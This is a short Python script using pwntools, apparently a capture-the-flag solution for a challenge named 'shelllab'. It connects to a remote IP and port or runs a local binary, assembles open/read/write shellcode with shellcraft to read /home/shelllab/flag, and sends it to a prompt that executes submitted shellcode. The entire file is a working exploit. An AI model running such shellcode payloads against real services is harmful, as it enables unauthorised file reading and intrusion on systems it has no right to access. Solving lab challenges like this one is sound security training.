#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('140.112.31.97', '30101')
else:
    p = process("./shelllab")


# pause()

flag = "/home/shelllab/flag"

payload  = flat(
    asm(shellcraft.pushstr(flag)) +
    asm(shellcraft.open('rsp', 0, 0)) + 
    asm(shellcraft.read('rax', 'rsp', 100)) +
    asm(shellcraft.write(1, 'rsp', 100))
)

p.sendlineafter("Give me your shellcode : ", payload)

p.interactive()
p.close()
